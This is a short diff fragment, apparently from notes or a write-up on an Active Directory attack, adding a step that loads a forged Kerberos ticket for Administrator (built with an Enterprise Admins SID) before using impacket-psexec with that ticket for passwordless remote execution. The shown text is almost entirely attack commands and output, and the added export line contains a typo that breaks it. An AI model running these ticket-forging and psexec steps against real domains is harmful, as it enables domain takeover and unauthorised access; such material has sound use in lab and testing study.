@@ -42,6 +42,11 @@ S-1-5-21-4152727142-2927276756-3439155973-519 \
 
 output:[*] Saving ticket in Administrator .ccache
 
+Step 4 - Load ticket and verfiy
+bash
+   export rt KRB5CCNAME=$(pwd)/Administrator.ccache
+   klist -c Administrator.ccache
+
 Step 5 - Use ticket(hostname,not IP -Kerberos requires SPN match)
 bash 
 impacket-psexec -k -no-pass \
